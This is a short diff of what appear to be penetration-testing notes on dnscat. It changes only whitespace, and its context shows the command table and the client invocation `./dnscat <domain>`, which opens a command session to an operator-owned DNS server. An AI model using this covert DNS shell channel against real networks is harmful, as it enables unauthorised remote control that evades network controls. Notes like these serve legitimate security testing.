@@ -22,7 +22,6 @@ The server is set up on a DNS server you own. - if DNS servers are not restricte
 
 Once a client connected to the server, each connection is a "window". If you open a shell, another window is created. --> ctrl+z to go to main thread, then interact with shell window
 
-
 | Command              | Purpose                           |
 | -------------------- | --------------------------------- |
 | `?`                  | help                              |
@@ -36,4 +35,5 @@ Once a client connected to the server, each connection is a "window". If you ope
 `./dnscat <domain>` or `./dnscat --dns server=x.x.x.x,port=53`
 
 client opens a command session per default
+
 # Snippets
